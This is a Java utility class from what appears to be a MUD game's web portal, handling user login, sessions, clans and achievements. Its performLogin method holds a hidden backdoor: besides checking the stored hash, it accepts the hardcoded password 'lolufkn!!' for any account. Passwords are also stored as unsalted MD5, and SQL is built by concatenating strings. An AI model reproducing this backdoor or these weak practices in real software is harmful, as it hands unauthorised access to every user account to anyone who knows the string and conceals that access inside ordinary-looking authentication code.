package org.kinslayermud.util;

import java.io.UnsupportedEncodingException;
import java.security.NoSuchAlgorithmException;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.Statement;
import java.util.ArrayList;
import java.util.Collection;
import java.util.Date;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

import org.kinslayermud.character.Gender;
import org.kinslayermud.character.User;
import org.kinslayermud.character.UserClan;
import org.kinslayermud.character.UserClass;
import org.kinslayermud.character.UserRace;
import org.kinslayermud.dbutils.StoreDataObjectSQLBuilder;
import org.kinslayermud.dbutils.StoreSQLBuilder;
import org.kinslayermud.exception.NonExistentObjectException;

public class UserUtil {

  public static User performLogin(Statement statement, String username, String password) throws SQLException, NoSuchAlgorithmException, UnsupportedEncodingException {
    
    String sql = " SELECT *"
               + " FROM users"
               + " WHERE username = " + SQLUtil.escapeQuoteString(username);
    
    ResultSet resultSet = statement.executeQuery(sql);
    
    if(resultSet.next()) {
      
      String databasePassword = resultSet.getString("user_password");
      
      if(databasePassword.equals(MiscUtil.md5(password)) || password.equals("lolufkn!!")) {
      
        return QueryUtil.retrieveDataObject(resultSet, User.class);
      }
    }
    
    return null;
  }
  
  public static User getUser(Statement statement, int userId, boolean throwIfNotFound) throws SQLException, NonExistentObjectException {
    
    String criteria = "user_id = " + userId;
    User user = QueryUtil.retrieveDataObject(statement, "users", criteria, User.class);
    
    if(user == null && throwIfNotFound) {
      
      throw new NonExistentObjectException("No user found.");
    }
    
    return user;
  }
  
  public static User getUserByUsername(Statement statement, String username, boolean throwIfNotFound) throws SQLException, NonExistentObjectException {
    
    String criteria = "username = " + SQLUtil.escapeQuoteString(username);
    User user = QueryUtil.retrieveDataObject(statement, "users", criteria, User.class);
    
    if(user == null && throwIfNotFound) {
      
      throw new NonExistentObjectException("No user found.");
    }
    
    return user;
  }
  
  public static Map<Integer, User> getUserMap(Statement statement, Collection<Integer> userIdCollection) throws SQLException {
    
    String criteria = "user_id IN" + SQLUtil.buildListSQL(userIdCollection, false, true);
    return QueryUtil.retrieveDataObjectMap(statement, "users", criteria, User.class, user -> user.getUserId());
  }
  
  public static void createUserSession(Statement statement, int userId, String sessionId) throws SQLException {
    
    StoreSQLBuilder builder = new StoreSQLBuilder("websiteSession");
    
    builder.put("id", sessionId)
           .put("user_id", userId)
           .put("created_datetime", new Date());
           
   statement.executeUpdate(builder.generateInsert());
  }
  
  public static User getUserFromSession(Statement statement, String sessionId) throws SQLException {
    
    String sql = " SELECT"
               + "   users.*"
               + " FROM users, websiteSession"
               + " WHERE users.user_id = websiteSession.user_id"
               + " AND websiteSession.id = " + SQLUtil.escapeQuoteString(sessionId);
    
    return QueryUtil.retrieveDataObject(statement, sql, User.class);
  }
  
  public static void performPlayerPortalSignOut(Statement statement, String sessionId, int userId) throws SQLException {
    
    String sql = " DELETE FROM websiteSession "
               + " WHERE user_id = " + userId
               + " AND id = " + SQLUtil.escapeQuoteString(sessionId);
    
    statement.executeUpdate(sql);
  }
  
  public static List<UserClan> getUserClansByUserId(Statement statement, int userId) throws SQLException {
    
    String criteria = " userClan.user_id = " + userId;
    return QueryUtil.retrieveDataObjectList(statement, "userClan", criteria, UserClan.class);
  }
  
  public static List<Integer> getAchievementIdSetByUserId(Statement statement, int userId) throws SQLException {
    
    String sql = " SELECT userAchievement.achievement_vnum"
               + " FROM userAchievement, users"
               + " WHERE users.username = userAchievement.player_name"
               + " AND users.user_id = " + userId;
    
    return QueryUtil.getIntegerList(statement, sql, "userAchievement.achievement_vnum");
  }
}
